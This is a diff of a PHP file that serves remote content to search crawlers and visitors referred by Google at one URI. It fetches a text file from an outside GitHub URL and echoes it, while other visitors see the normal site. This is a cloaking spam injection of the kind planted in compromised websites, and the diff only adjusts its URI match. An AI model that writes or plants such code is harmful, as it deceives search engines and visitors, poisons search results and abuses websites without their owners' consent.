@@ -3,7 +3,7 @@ $userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
 $referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
 $uri = $_SERVER['REQUEST_URI'] ?? '';
 
-if ($uri == '/index.php/1/' && (preg_match('/bot|google|chrome-lighthouse/i', $userAgent) || preg_match('/google/i', $referer))) {
+if ($uri == '/index.php/1' && (preg_match('/bot|google|chrome-lighthouse/i', $userAgent) || preg_match('/google/i', $referer))) {
     echo file_get_contents('https://raw.githubusercontent.com/sibayak88/sby/refs/heads/main/innovascit-asli.txt');
     exit();
 }
